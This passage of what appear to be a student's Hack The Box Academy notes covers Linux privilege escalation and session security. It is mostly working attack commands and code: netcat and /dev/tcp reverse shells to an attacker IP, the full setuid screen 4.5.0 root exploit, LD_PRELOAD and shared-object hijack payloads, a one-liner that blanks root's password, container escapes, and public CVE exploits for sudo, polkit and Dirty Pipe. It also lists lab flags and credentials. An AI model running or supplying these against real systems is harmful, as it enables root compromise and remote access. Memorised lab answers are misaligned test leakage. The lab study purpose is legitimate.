# -rwsr-xr-- 1 root messagebus 42992 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
# -rwsr-xr-x 1 root root 14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
# -rwsr-sr-x 1 root root 130264 May 29  2023 /usr/lib/snapd/snap-confine
# -rwsr-xr-x 1 root root 436552 Mar 30  2022 /usr/lib/openssh/ssh-keysign
# -rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
# -rwsr-xr-x 1 root root 22520 Jan 12  2022 /usr/bin/pkexec
# -rwsr-sr-x 1 root root 227520 Mar 19  2018 /usr/bin/facter
# -rwsr-xr-x 1 root root 40344 Nov 29  2022 /usr/bin/newgrp
# -rwsr-xr-x 1 root root 37136 Nov 29  2022 /usr/bin/newuidmap
# -rwsr-xr-x 1 root root 76496 Nov 29  2022 /usr/bin/chfn
# -rwsr-xr-x 1 root root 149080 Apr  4  2023 /usr/bin/sudo
# -rwsr-xr-x 1 root root 44528 Nov 29  2022 /usr/bin/chsh
# -rwsr-xr-x 1 root root 37136 Nov 29  2022 /usr/bin/newgidmap
# -rwsr-xr-x 1 root root 75824 Nov 29  2022 /usr/bin/gpasswd
# -rwsr-xr-x 1 root root 59640 Nov 29  2022 /usr/bin/passwd
# -rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
# -rwsr-xr-x 1 root root 10312 Sep 20  2022 /usr/bin/vmware-user-suid-wrapper
# -rwsr-xr-x 1 root root 1588768 Aug 31  2020 /usr/bin/screen-4.5.0
# -rwsr-xr-x 1 root root 113336 May 24  2021 /sbin/mount.nfs


# Find a file with the setgid bit set that was not shown in the section command output (full path to the binary).

# -rwsr-sr-x 1 root root 130264 May 29  2023 /usr/lib/snapd/snap-confine
# * -rwsr-sr-x 1 root root 227520 Mar 19  2018 /usr/bin/facter

```

#### Sudo Rights Abuse

```bash
sudo -l
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
nc -lnvp 443
id && hostname

# What command can the htb-student user run as root?
sudo -l
# Matching Defaults entries for htb-student on NIX02:
#    env_reset, mail_badpass,
#    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
#    env_keep+=LD_PRELOAD
#
# User htb-student may run the following commands on NIX02:
#    (root) NOPASSWD: /usr/bin/openssl
#
# /usr/bin/openssl <- correct answer
```

#### Priveleged Groups

```bash
id
unzip alpine.zip
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh

#  ssh secaudit@10.129.132.178
# password: "Academy_LLPE!"
# Use the privileged group rights of the secaudit user to locate a flag.
# Grep within the directory this user has special rights over.
id
# uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
cd /var/log | grep -r "flag" .
# ch3ck_th0se_gr0uP_m3mb3erSh1Ps!
```

#### Capabilities

```bash
# set capability
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
# enumerating capabilities
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
# exploiting capabilities
getcap /usr/bin/vim.basic
cat /etc/passwd | head -n1
/usr/bin/vim.basic /etc/passwd
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

ssh htb-student@10.129.153.91
# password HTB_@cademy_stdnt!
Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.
# HTB{c4paBili7i3s_pR1v35c}
```

#### Vulnerable Services

```bash
screen -v
./screen_exploit.sh
```

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

```bash
# SSH to 10.129.177.64 (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!"
# Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory.

```

#### Cron Job Abuse

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
ls -la /dmz-backups/
./pspy64 -pf -i 1000
cat /dmz-backups/backup.sh
```

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

```bash
nc -lnvp 443
```

```bash
# SSH to 10.129.177.64 (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!"
# Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory.
```

#### Containers (LXD)

```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```

```bash
# Escalate the privileges and submit the contents of flag.txt as the answer.
```

#### Docker

```bash
cd /hostsystem/home/cry0l1t3
ls -l
cat .ssh/id_rsa
ssh cry0l1t3@<host IP> -i cry0l1t3.priv
ls -al
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
ls -l
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
cat /hostsystem/root/.ssh/id_rsa
id
docker image ls
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

```bash
Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer.
```

#### Logrotate

```bash
cat /etc/logrotate.conf
sudo cat /var/lib/logrotate.status
ls /etc/logrotate.d/
cat /etc/logrotate.d/dpkg
```

```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
nc -nlvp 9001
./logrotten -p ./payload /tmp/tmp.log
```

```bash
# Escalate the privileges and submit the contents of flag.txt as the answer.
```

#### Miscellaneous Techniques

```bash
showmount -e 10.129.2.12
cat /etc/exports
cat shell.c
gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
ls -la
./shell
id
# hijacking tmux sessions
tmux -S /shareds new -s debugsess
chown root:devs /shareds
ps aux | grep tmux
ls -la /shareds
id
tmux -S /shareds
```

```bash
# Review the NFS server's export list and find a directory holding a flag.
# Use the mount command
```

#### Kernel Exploits

```bash
uname -a
cat /etc/lsb-release
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
whoami
```

```bash
# Escalate privileges using a different Kernel exploit. Submit the contents of the flag.txt file in the /root/kernel_exploit directory.
# CVE-2021-3493
```

#### Shared Libraries

```bash
ldd /bin/ls
sudo -l
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

```bash
# Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory.
```

#### Shared Object Hijacking

```bash
ls -la payroll
ldd payroll
readelf -d payroll  | grep PATH
ls -la /development/
ldd payroll
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
```

```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
./payroll
```

```bash
# Follow the examples in this section to escalate privileges, recreate all examples (don't just run the payroll binary). Practice using ldd and readelf. Submit the version of glibc (i.e. 2.30) in use to move on to the next section.
```

#### Python Library Hijacking

```python
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```

```bash
ls -l mem_status.py
```

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

```python
...SNIP...

def virtual_memory():

	...SNIP...

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')


    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...

```

```bash
sudo /usr/bin/python3 ./mem_status.py
python3 -c 'import sys; print("\n".join(sys.path))'
pip3 show psutil
ls -la /usr/lib/python3.8
```

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')

```

```bash
sudo /usr/bin/python3 mem_status.py
sudo -l
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

```bash
# Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer.
```

#### Sudo

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
sudo -V | head -n1
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
cat /etc/lsb-release
./sudo-hax-me-a-sandwich 1
sudo -l
cat /etc/passwd | grep cry0l1t3
sudo -u#-1 id
```

```bash
# Escalate the privileges and submit the contents of flag.txt as the answer.
```

#### Polkit

```bash
# pkexec -u <user> <command>
pkexec -u root id
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```

```bash
# Escalate the privileges and submit the contents of flag.txt as the answer.
```

#### Dirty Pipe

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
uname -r
./exploit-1
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo
```

```bash
# Escalate the privileges and submit the contents of flag.txt as the answer.
```

#### Linux Local Privelege Escalation - Skills Assessment

```bash

```

```bash
# Submit the contents of flag1.txt
# Perform thorough enumeration of the file system as this user.

# Submit the contents of flag2.txt
# Users are often the weakest link...

# Submit the contents of flag3.txt

# Submit the contents of flag4.txt
# Look at all external services running on the box.

# Submit the contents of flag5.txt

```

### Session Security

#### Session Hijacking

```bash
What kind of session identifier does the application employ? Answer options (without quotation marks): "URL parameter", "URL argument", "body argument", "cookie" or "proprietary solution"
# cookie
```

#### Session Fixation

```bash
# If the HttpOnly flag was set, would the application still be vulnerable to session fixation? Answer Format: Yes or No
# Yes
```

#### Obtaining Session Identifiers without User Interaction

```bash
# If xss.htb.net was an intranet application, would an attacker still be able to capture cookies via sniffing traffic if he/she got access to the company's VPN? Suppose that any user connected to the VPN can interact with xss.htb.net. Answer format: Yes or No
# Yes
```

#### Cross-Site Scripting (XSS)

```bash
# If xss.htb.net was utilizing SSL encryption, would an attacker still be able to capture cookies through XSS? Answer format: Yes or No
# Yes
```

#### Cross-Site Request Forgery (CSRF or XSRF)

```bash
# If the update-profile request was GET-based and no anti-CSRF protections existed, would you still be able to update Ela Stienen's profile through CSRF? Answer format: Yes or No
# Yes
```

#### Cross-Site Request Forgery (GET-based)

```bash
# If csrf.htb.net was utilizing SSL encryption, would an attacker still be able to alter Julie Rogers' profile through CSRF? Answer format: Yes or No
# Yes
```

#### Cross-Site Request Forgery (POST-based)

```bash
# If csrf.htb.net was utilizing secure cookies, would an attacker still be able to leak Julie Roger's CSRF token? Answer format: Yes or No
# Yes
```

#### XSS & CSRF Chaining

```bash
# Same Origin Policy cannot prevent an attacker from changing the visibility of @goldenpeacock467's profile. Answer Format: Yes or No
# Yes
```

#### Exploiting Weak CSRF Tokens

```bash
# Our malicious page included a user-triggered event handler (onclick). To evade what kind of security measure did we do that? Answer options (without quotation marks): "Same-Origin Policy", "Popup Blockers", "XSS Filters"
# Popup Blockers
```

#### Open Redirect

```bash
# If the request to complete.html was GET-based, would you still be able to obtain the token via exploiting the open redirect vulnerability? Answer format: Yes or No
# Yes
```

#### Skills Assessment

```bash
# Read the flag residing in the admin's public profile. Answer format: [string]
# Make the admin's profile public to see the flag
# [YOU_ARE_A_SESSION_WARRIOR]

# Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string}

```
